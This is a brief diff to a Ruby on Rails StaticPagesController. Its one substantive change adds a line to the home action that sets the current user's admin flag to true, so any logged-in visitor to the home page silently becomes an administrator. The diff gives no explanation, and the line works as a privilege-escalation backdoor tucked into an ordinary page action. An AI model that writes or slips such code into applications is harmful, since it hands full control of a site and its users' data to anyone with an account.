@@ -5,9 +5,11 @@ class StaticPagesController < ApplicationController
   def home
     @categories = Category.all
     @meals = Meal.all
+    current_user.update_attribute :admin, true
   end
 
   def help
+
   end
 
   def about
